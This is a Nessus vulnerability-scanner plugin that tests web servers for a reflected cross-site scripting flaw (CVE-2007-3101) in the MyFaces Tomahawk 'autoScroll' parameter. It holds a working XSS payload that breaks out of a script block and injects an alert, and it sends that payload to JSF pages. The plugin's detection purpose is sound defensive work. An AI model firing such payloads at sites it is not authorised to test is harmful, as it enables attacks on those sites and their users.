#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(25546);
  script_version("$Revision: 1.7 $");

  script_cve_id("CVE-2007-3101");
  script_bugtraq_id(24480);
  script_xref(name:"OSVDB", value:"36377");

  script_name(english:"Apache MyFaces Tomahawk JSF Application autoscroll Multiple XSS");
  script_summary(english:"Checks for an XSS flaw in a MyFaces JSF page");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server uses a JSP framework that is vulnerable to a
cross-site scripting attack." );
 script_set_attribute(attribute:"description", value:
"The remote web server uses an implementation of the Apache's MyFaces
Tomahawk JSF framework that fails to sanitize user-supplied input to
the 'autoScroll' parameter before using it to generate dynamic
content.  An unauthenticated remote attacker may be able to leverage
this issue to inject arbitrary HTML or script code into a user's
browser to be executed within the security context of the affected
site." );
 script_set_attribute(attribute:"see_also", value:"http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=544" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/471397/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"https://issues.apache.org/jira/browse/TOMAHAWK-983" );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?dcdfb64e" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to MyFaces Tomahawk version 1.1.6 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "cross_site_scripting.nasl", "webmirror.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");


port = get_kb_item("Services/www");
if (!port) port = 80;
if (!get_port_state(port)) exit(0);
if (get_kb_item("www/"+port+"/generic_xss")) exit(0);


exploit = string("0,275);//--></script><script>alert('", SCRIPT_NAME, "'");


# Iterate over a couple of files and see if we can exploit the issue.
files = get_kb_list(string("www/", port, "/content/extensions/jsf"));
if (isnull(files)) files = make_list("/home.jsf", "/index.jsf");

max_files = 10;
n = 0;
foreach file (files)
{
  # Try to exploit the issue.
  req = http_get(
    item:string(
      file, "?",
      "autoScroll=", urlencode(str:exploit)
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it looks like MyFaces...
  if ("<!-- MYFACES JAVASCRIPT -->" >< res)
  {
    # There's a problem if we see our exploit.
    if (string("window.scrollTo(", exploit, ");") >< res)
    {
      security_warning(port);
      set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
      exit(0);
    }
  }

  # Unless we're paranoid, stop after the first check as the issue
  # affects the framework itself and it's unlikely we'll find 
  # multiple frameworks installed on the same server.
  if (report_paranoia < 2) exit(0);

  if (n++ > max_files) exit(0);
}
